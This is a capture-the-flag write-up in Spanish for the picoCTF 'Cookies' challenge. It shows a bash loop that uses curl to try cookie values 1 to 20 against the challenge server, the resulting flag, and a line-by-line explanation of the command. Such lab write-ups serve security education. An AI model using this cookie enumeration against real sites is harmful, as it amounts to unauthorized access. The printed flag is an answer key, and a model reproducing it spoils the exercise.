# DESCRIPCIÓN:
Who doesn't love cookies? Try to figure out the best one.
# SOLUCIÓN:
#### picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
```
┌──(mony㉿Mony)-[~]
└─$ for i in {1..20}; do curl -s http://wily-courier.picoctf.net:53815/check -H "Cookie: name=$i" | grep "picoCTF"; done
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}

```
# NOTAS ADICIONALES:
- **`for i in {1..20}; do ... ; done`**: Es un bucle. Le dice a la terminal que repita el comando central 20 veces. En cada repetición, la variable `$i` cambiará de valor, empezando en 1 y terminando en 20.
- **`curl -s`**: `curl` es una herramienta que sirve para hacer peticiones a páginas web directamente desde la terminal. La opción `-s` (_silent_ o silencioso) evita que se muestren barras de progreso o información innecesaria en la pantalla.
-  **`-H "Cookie: name=$i"`**: Esta es la parte clave. Envía un encabezado HTTP (`-H`) que modifica tu "Cookie". En el primer intento le dice al servidor "Soy el usuario con la cookie 1", en el segundo intento "Soy la cookie 2", y así sucesivamente hasta el 20.

# REFERENCIAS:
http://wily-courier.picoctf.net:53815/